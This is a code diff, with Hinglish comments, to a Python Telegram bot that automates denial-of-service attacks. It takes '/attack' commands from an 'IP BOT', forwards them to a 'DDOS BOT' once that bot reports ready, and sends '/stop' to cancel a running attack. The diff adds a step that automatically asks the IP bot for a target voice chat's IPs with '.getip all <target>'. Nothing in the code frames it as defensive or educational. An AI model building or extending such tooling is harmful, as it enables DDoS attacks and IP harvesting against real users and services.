@@ -34,7 +34,7 @@ chat_state: dict[int, dict] = {}
 
 # --------- HELPERS ----------
 async def try_execute(cid: int):
-    """Bot READY + pending_cmd + armed + target -> CMD BOT_B ko bhejo."""
+    """Bot READY + pending_cmd + armed + target -> CMD BOT_B ko bhejo (TG test se)."""
     state = chat_state.get(cid)
     if not state:
         return
@@ -54,11 +54,13 @@ async def try_execute(cid: int):
     state["bot_ready"] = False
 
     print(f"[FSM {cid}] START CMD -> {cmd} | target={state['target']}")
+    # TG test bot se BOT_B ko command
+    # (Telethon client use kar rahe hain, lekin account wahi hai jisse tum TG test bot control kar rahe ho)
     await tele.send_message(BOT_B_ID, cmd)
 
 
 async def cancel_task(cid: int):
-    """Agar koi CMD RUNNING hai to /stop bhejo."""
+    """Agar koi CMD RUNNING hai to BOT_B ko /stop bhejo."""
     state = chat_state.get(cid)
     if not state or not state["running"]:
         return
@@ -70,7 +72,7 @@ async def cancel_task(cid: int):
     state["current_cmd"] = None
 
 
-# --------- TELETHON LISTENER (single) ----------
+# --------- TELETHON LISTENER ----------
 @tele.on(events.NewMessage)
 async def generic_listener(event):
     """Har new message pe check karo sender BOT_A hai ya BOT_B."""
@@ -87,10 +89,7 @@ async def generic_listener(event):
     if BOT_A_ID is not None and sender_id == BOT_A_ID:
         print("📩 IP BOT REPLY:", text)
 
-        # CMD line — markdown variations handle:
-        # CMD: /attack ...
-        # **CMD:** /attack ...
-        # `CMD:` /attack ...
+        # CMD line – CMD:, **CMD:**, `CMD:` sab ke liye
         m = re.search(r"CMD[:*s`]*s*(.+)", text, flags=re.IGNORECASE)
         if not m:
             return
@@ -119,7 +118,7 @@ async def generic_listener(event):
                 print(f"[FSM {cid}] Idle -> pending set, try_execute.")
                 await try_execute(cid)
 
-    # ---------- BOT B (DDOS / target) ----------
+    # ---------- BOT B (DDOS / status) ----------
     if BOT_B_ID is not None and sender_id == BOT_B_ID:
         low = text.lower()
         print("DDOS BOT MSG:", repr(text))
@@ -134,6 +133,7 @@ async def generic_listener(event):
         if not is_ready:
             return
 
+        # BOT_B READY ho gaya
         for cid, state in chat_state.items():
             if not state["armed"]:
                 continue
@@ -172,7 +172,7 @@ async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def start_fsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Event-driven system ON."""
+    """Event-driven system ON + BOT_A ko auto .getip all bhejo."""
     cid = update.effective_chat.id
     old = chat_state.get(cid)
 
@@ -185,12 +185,21 @@ async def start_fsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "target": old["target"] if old and "target" in old else None,
     }
 
+    state = chat_state[cid]
+    target = state["target"]
+
     await update.message.reply_text(
         '''✅ Event-driven mode ON.
 • /setlinkchatid se target set karo.
 • IP BOT se aane wale CMD: (attack / vote / board) auto handle honge.
 • BOT_B READY pe pending CMD auto start, same CMD ignore, naya pe /stop + start.'''
     )
+
+    # target set hai to IP BOT se VC ka IP auto mangwao
+    if target:
+        msg = f".getip all {target}"
+        print(f"[FSM {cid}] AUTO SEND to BOT_A:", msg)
+        await tele.send_message(BOT_A_ID, msg)
 
 
 async def stop_fsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
